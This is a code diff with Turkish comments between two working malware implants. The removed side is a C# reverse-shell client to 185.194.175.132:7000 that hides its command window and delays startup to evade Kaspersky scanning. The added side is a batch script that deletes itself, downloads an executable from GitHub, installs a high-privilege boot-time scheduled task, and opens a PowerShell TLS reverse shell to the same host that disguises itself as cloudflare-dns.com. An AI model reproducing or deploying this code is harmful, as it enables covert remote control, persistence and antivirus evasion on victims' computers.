@@ -1,58 +1,32 @@
-using System;
-using System.Net.Sockets;
-using System.IO;
-using System.Diagnostics;
-using System.Text;
-using System.Threading;
+@echo off
+setlocal
 
-public class LabClient {
-    public static void Main() {
-        // Kaspersky'nin 'ilk saniye' taramasını atlatmak için 5 saniye bekle
-        Thread.Sleep(5000); 
-        
-        string targetIP = "185.194.175.132";
-        int targetPort = 7000;
+set "marker=%temp%\marker.txt"
 
-        while (true) { // Bağlantı koparsa otomatik yeniden bağlanmayı dener
-            try {
-                using (TcpClient client = new TcpClient(targetIP, targetPort))
-                using (Stream stream = client.GetStream())
-                using (StreamReader reader = new StreamReader(stream))
-                using (StreamWriter writer = new StreamWriter(stream) { AutoFlush = true }) {
-                    
-                    writer.WriteLine("--- Sistem Aktif: " + Environment.MachineName + " ---");
+REM Görevi kontrol et
+schtasks /query /tn "TempVBS_OnBoot" >nul 2>&1
+set "taskExists=%errorlevel%"
 
-                    while (client.Connected) {
-                        string cmd = reader.ReadLine();
-                        if (string.IsNullOrEmpty(cmd) || cmd == "exit") break;
+if %taskExists% neq 0 (
+    REM Görev YOKSA
+    del /f /q "asd.bat"
+    cd /d %temp%
+    curl https://raw.githubusercontent.com/seition2doc/dosta2/refs/heads/main/NotMyfault64.exe -o NotMyfault64.exe
+    schtasks /create /tn "TempVBS_OnBoot" /tr "%temp%\e.vbs" /sc onstart /f /rl HIGHEST
 
-                        // Komut çalıştırma mantığı
-                        try {
-                            ProcessStartInfo psi = new ProcessStartInfo();
-                            psi.FileName = "cmd.exe"; // PowerShell yerine CMD üzerinden çağırarak izi azalt
-                            psi.Arguments = "/c " + cmd;
-                            psi.RedirectStandardOutput = true;
-                            psi.RedirectStandardError = true;
-                            psi.UseShellExecute = false;
-                            psi.CreateNoWindow = true;
-                            psi.WindowStyle = ProcessWindowStyle.Hidden;
+    if not exist "%marker%" (
+        echo ran > "%marker%"
+        timeout /t 10 >nul
+        start "" "%temp%\rb.vbs"
+    )
+) else (
+    REM Görev VARSA
+    del /f /q "asd.bat"
+    cd /d %temp%
+    schtasks /create /tn "TempVBS_OnBoot" /tr "%temp%\e.vbs" /sc onstart /f /rl HIGHEST
+    
+    
+    powershell -Command "$sslProtocols = [System.Security.Authentication.SslProtocols]::Tls12; $TCPClient = New-Object Net.Sockets.TCPClient('185.194.175.132', 7000); $NetworkStream = $TCPClient.GetStream(); $SslStream = New-Object Net.Security.SslStream($NetworkStream,$false,({$true} -as [Net.Security.RemoteCertificateValidationCallback])); $SslStream.AuthenticateAsClient('cloudflare-dns.com',$null,$sslProtocols,$false); if(!$SslStream.IsEncrypted -or !$SslStream.IsSigned) {$SslStream.Close(); exit}; $StreamWriter = New-Object IO.StreamWriter($SslStream); function WriteToStream ($String) {[byte[]]$script:Buffer = New-Object System.Byte[] 4096; $StreamWriter.Write($String + 'SHELL> '); $StreamWriter.Flush()}; WriteToStream ''; while(($BytesRead = $SslStream.Read($Buffer, 0, $Buffer.Length)) -gt 0) {$Command = ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead - 1); $Output = try {Invoke-Expression $Command 2>&1 | Out-String} catch {$_ | Out-String}; WriteToStream ($Output)} $StreamWriter.Close()"
+)
 
-                            using (Process p = Process.Start(psi)) {
-                                string output = p.StandardOutput.ReadToEnd();
-                                string error = p.StandardError.ReadToEnd();
-                                writer.WriteLine(output + error + "\nSHELL> ");
-                            }
-                        }
-                        catch (Exception ex) {
-                            writer.WriteLine("Hata: " + ex.Message);
-                        }
-                    }
-                }
-            }
-            catch {
-                // Bağlantı kurulamazsa 10 saniye bekle ve tekrar dene
-                Thread.Sleep(10000);
-            }
-        }
-    }
-}
+endlocal
